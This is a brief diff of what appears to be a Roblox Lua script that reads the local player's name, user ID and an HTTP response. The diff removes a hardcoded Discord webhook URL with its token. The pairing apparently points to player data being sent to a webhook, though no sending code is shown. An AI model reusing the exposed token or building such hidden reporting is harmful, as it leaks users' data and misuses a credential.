@@ -3,8 +3,6 @@ local Response = request({
     Method = "GET"
 })
 
-
-local url = "https://discord.com/api/webhooks/1150572233211772969/5bpbAcMnFyXdmyfaxSJ0vju40fYdAWnfRm7aCtLRXhes48-EjJSdEGABDySC3gmXnpHh"
 localusername = game.Players.LocalPlayer.Name
 localuserid = game.Players.LocalPlayer.UserId
 userinfo = Response.Body
